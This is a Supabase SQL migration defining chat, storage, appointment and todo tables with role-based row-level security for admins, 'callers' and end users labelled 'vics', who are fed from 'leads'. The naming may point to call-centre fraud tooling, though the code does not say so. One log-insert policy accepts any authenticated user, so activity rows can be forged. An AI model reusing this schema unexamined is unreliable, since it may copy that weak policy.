CREATE POLICY "Admins can insert chat messages" ON public.chat_messages FOR INSERT TO authenticated WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can update chat messages" ON public.chat_messages FOR UPDATE TO authenticated USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can delete chat messages" ON public.chat_messages FOR DELETE TO authenticated USING (public.has_role(auth.uid(), 'admin'));

CREATE TABLE public.chat_templates (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  shortcode text NOT NULL UNIQUE,
  content text NOT NULL,
  created_by uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_templates TO authenticated;
GRANT ALL ON public.chat_templates TO service_role;
ALTER TABLE public.chat_templates ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Team can select chat templates" ON public.chat_templates FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin') OR public.has_role(auth.uid(), 'caller'));
CREATE POLICY "Admins can insert chat templates" ON public.chat_templates FOR INSERT TO authenticated WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can update chat templates" ON public.chat_templates FOR UPDATE TO authenticated USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Admins can delete chat templates" ON public.chat_templates FOR DELETE TO authenticated USING (public.has_role(auth.uid(), 'admin'));

ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;

CREATE POLICY "Chat attachments: vic manage own folder" ON storage.objects FOR SELECT TO authenticated
USING (bucket_id = 'chat-attachments' AND (storage.foldername(name))[1] = auth.uid()::text);
CREATE POLICY "Chat attachments: vic upload own folder" ON storage.objects FOR INSERT TO authenticated
WITH CHECK (bucket_id = 'chat-attachments' AND (storage.foldername(name))[1] = auth.uid()::text);
CREATE POLICY "Chat attachments: admins select" ON storage.objects FOR SELECT TO authenticated
USING (bucket_id = 'chat-attachments' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Chat attachments: admins insert" ON storage.objects FOR INSERT TO authenticated
WITH CHECK (bucket_id = 'chat-attachments' AND public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Chat attachments: callers select assigned" ON storage.objects FOR SELECT TO authenticated
USING (bucket_id = 'chat-attachments' AND public.has_role(auth.uid(), 'caller')
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id::text = (storage.foldername(name))[1] AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Chat attachments: callers insert assigned" ON storage.objects FOR INSERT TO authenticated
WITH CHECK (bucket_id = 'chat-attachments' AND public.has_role(auth.uid(), 'caller')
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id::text = (storage.foldername(name))[1] AND p.assigned_caller_id = auth.uid()));

CREATE POLICY "Callers read assigned documents" ON storage.objects FOR SELECT TO authenticated
USING (bucket_id = 'user-documents' AND public.has_role(auth.uid(), 'caller')
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id::text = (storage.foldername(name))[1] AND p.assigned_caller_id = auth.uid()));

CREATE TABLE public.appointments (
  id uuid NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  vic_id uuid NOT NULL REFERENCES public.profiles(id) ON DELETE CASCADE,
  caller_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
  appointment_date date NOT NULL,
  appointment_time time NOT NULL,
  status text NOT NULL DEFAULT 'gebucht',
  is_transferred boolean NOT NULL DEFAULT false,
  reason text,
  created_by uuid,
  created_at timestamptz NOT NULL DEFAULT now(),
  updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE ON public.appointments TO authenticated;
GRANT ALL ON public.appointments TO service_role;
ALTER TABLE public.appointments ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Vics manage own appointments select" ON public.appointments FOR SELECT TO authenticated USING (vic_id = auth.uid());
CREATE POLICY "Vics insert own appointments" ON public.appointments FOR INSERT TO authenticated WITH CHECK (vic_id = auth.uid());
CREATE POLICY "Vics update own appointments" ON public.appointments FOR UPDATE TO authenticated USING (vic_id = auth.uid()) WITH CHECK (vic_id = auth.uid());
CREATE POLICY "Callers select assigned appointments" ON public.appointments FOR SELECT TO authenticated USING (
  public.has_role(auth.uid(), 'caller')
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = appointments.vic_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers update assigned appointments" ON public.appointments FOR UPDATE TO authenticated USING (
  public.has_role(auth.uid(), 'caller')
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = appointments.vic_id AND p.assigned_caller_id = auth.uid()))
WITH CHECK (public.has_role(auth.uid(), 'caller')
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = appointments.vic_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Callers insert appointments for assigned vics" ON public.appointments FOR INSERT TO authenticated
WITH CHECK (has_role(auth.uid(), 'caller'::app_role) AND caller_id = auth.uid()
  AND EXISTS (SELECT 1 FROM public.profiles p WHERE p.id = vic_id AND p.assigned_caller_id = auth.uid()));
CREATE POLICY "Admins manage appointments" ON public.appointments FOR ALL TO authenticated USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));

CREATE UNIQUE INDEX appointments_unique_active_slot
  ON public.appointments (COALESCE(caller_id, '00000000-0000-0000-0000-000000000000'::uuid), appointment_date, appointment_time)
  WHERE status = 'gebucht' AND is_transferred = false;
CREATE UNIQUE INDEX appointments_unique_open_per_vic
  ON public.appointments (vic_id) WHERE status = 'gebucht';

CREATE TRIGGER trg_appointments_updated
  BEFORE UPDATE ON public.appointments
  FOR EACH ROW EXECUTE FUNCTION public.leads_touch_updated_at();

CREATE OR REPLACE FUNCTION public.booked_slots_for_caller(_caller_id uuid, _from date, _to date)
RETURNS TABLE (appointment_date date, appointment_time time)
LANGUAGE sql STABLE SECURITY DEFINER SET search_path = public AS $$
  SELECT a.appointment_date, a.appointment_time
  FROM public.appointments a
  WHERE a.status = 'gebucht'
    AND a.appointment_date BETWEEN _from AND _to
    AND ((_caller_id IS NULL AND a.caller_id IS NULL)
      OR (_caller_id IS NOT NULL AND a.caller_id = _caller_id))
$$;
GRANT EXECUTE ON FUNCTION public.booked_slots_for_caller(uuid, date, date) TO authenticated;

CREATE OR REPLACE FUNCTION public.appointments_follow_caller()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NEW.assigned_caller_id IS DISTINCT FROM OLD.assigned_caller_id THEN
    UPDATE public.appointments
    SET caller_id = NEW.assigned_caller_id, is_transferred = true
    WHERE vic_id = NEW.id AND status = 'gebucht';
  END IF;
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_profiles_transfer_appointments
  AFTER UPDATE ON public.profiles
  FOR EACH ROW EXECUTE FUNCTION public.appointments_follow_caller();

CREATE TYPE public.todo_priority AS ENUM ('normal', 'dringend');
CREATE TYPE public.todo_status AS ENUM ('offen', 'abgeschlossen');

CREATE TABLE public.todos (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    title text NOT NULL,
    description text,
    assigned_caller_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
    priority public.todo_priority NOT NULL DEFAULT 'normal',
    status public.todo_status NOT NULL DEFAULT 'offen',
    due_date date,
    created_by uuid REFERENCES auth.users(id) ON DELETE SET NULL,
    completed_at timestamptz,
    completed_by uuid REFERENCES auth.users(id) ON DELETE SET NULL,
    created_at timestamptz NOT NULL DEFAULT now(),
    updated_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.todos TO authenticated;
GRANT ALL ON public.todos TO service_role;
ALTER TABLE public.todos ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins manage all todos" ON public.todos FOR ALL TO authenticated
USING (public.has_role(auth.uid(), 'admin')) WITH CHECK (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "Callers see own todos" ON public.todos FOR SELECT TO authenticated
USING (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'));
CREATE POLICY "Callers update own todos status" ON public.todos FOR UPDATE TO authenticated
USING (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'))
WITH CHECK (assigned_caller_id = auth.uid() AND public.has_role(auth.uid(), 'caller'));

CREATE TABLE public.todo_activity (
    id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
    todo_id uuid NOT NULL REFERENCES public.todos(id) ON DELETE CASCADE,
    actor_id uuid REFERENCES auth.users(id) ON DELETE SET NULL,
    action text NOT NULL,
    details jsonb NOT NULL DEFAULT '{}',
    created_at timestamptz NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT ON public.todo_activity TO authenticated;
GRANT ALL ON public.todo_activity TO service_role;
ALTER TABLE public.todo_activity ENABLE ROW LEVEL SECURITY;
CREATE POLICY "Admins read todo activity" ON public.todo_activity FOR SELECT TO authenticated USING (public.has_role(auth.uid(), 'admin'));
CREATE POLICY "System inserts todo activity" ON public.todo_activity FOR INSERT TO authenticated WITH CHECK (true);

CREATE OR REPLACE FUNCTION public.todos_restrict_caller_updates()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NOT public.has_role(auth.uid(), 'admin') THEN
    NEW.title := OLD.title;
    NEW.description := OLD.description;
    NEW.assigned_caller_id := OLD.assigned_caller_id;
    NEW.priority := OLD.priority;
    NEW.due_date := OLD.due_date;
    NEW.created_by := OLD.created_by;
  END IF;
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_todos_restrict_caller_updates
BEFORE UPDATE ON public.todos
FOR EACH ROW EXECUTE FUNCTION public.todos_restrict_caller_updates();

CREATE OR REPLACE FUNCTION public.todos_log_activity()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF TG_OP = 'INSERT' THEN
    IF NEW.assigned_caller_id IS NOT NULL THEN
      INSERT INTO public.todo_activity (todo_id, actor_id, action, details)
      VALUES (NEW.id, auth.uid(), 'assigned', jsonb_build_object('assigned_caller_id', NEW.assigned_caller_id));
    END IF;
  ELSIF TG_OP = 'UPDATE' THEN
    IF NEW.assigned_caller_id IS DISTINCT FROM OLD.assigned_caller_id AND NEW.assigned_caller_id IS NOT NULL THEN
      INSERT INTO public.todo_activity (todo_id, actor_id, action, details)
      VALUES (NEW.id, auth.uid(), 'assigned', jsonb_build_object('assigned_caller_id', NEW.assigned_caller_id));
    END IF;
    IF NEW.status = 'abgeschlossen' AND OLD.status <> 'abgeschlossen' THEN
      INSERT INTO public.todo_activity (todo_id, actor_id, action, details)
      VALUES (NEW.id, auth.uid(), 'completed', jsonb_build_object('completed_by', NEW.completed_by));
    END IF;
  END IF;
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_todos_log_activity
AFTER INSERT OR UPDATE ON public.todos
FOR EACH ROW EXECUTE FUNCTION public.todos_log_activity();

CREATE TRIGGER trg_todos_updated
BEFORE UPDATE ON public.todos
FOR EACH ROW EXECUTE FUNCTION public.leads_touch_updated_at();

REVOKE ALL ON FUNCTION public.todos_restrict_caller_updates() FROM public, anon, authenticated;
REVOKE ALL ON FUNCTION public.todos_log_activity() FROM public, anon, authenticated;

CREATE OR REPLACE FUNCTION public.leads_sync_vic_caller()
RETURNS trigger LANGUAGE plpgsql SECURITY DEFINER SET search_path = public AS $$
BEGIN
  IF NEW.assigned_caller_id IS DISTINCT FROM OLD.assigned_caller_id THEN
    UPDATE public.profiles
    SET assigned_caller_id = NEW.assigned_caller_id
    WHERE source_lead_id = NEW.id;
  END IF;
  RETURN NEW;
END; $$;
CREATE TRIGGER trg_leads_sync_vic_caller
AFTER UPDATE ON public.leads
FOR EACH ROW EXECUTE FUNCTION public.leads_sync_vic_caller();

GRANT UPDATE (reason) ON public.appointments TO authenticated;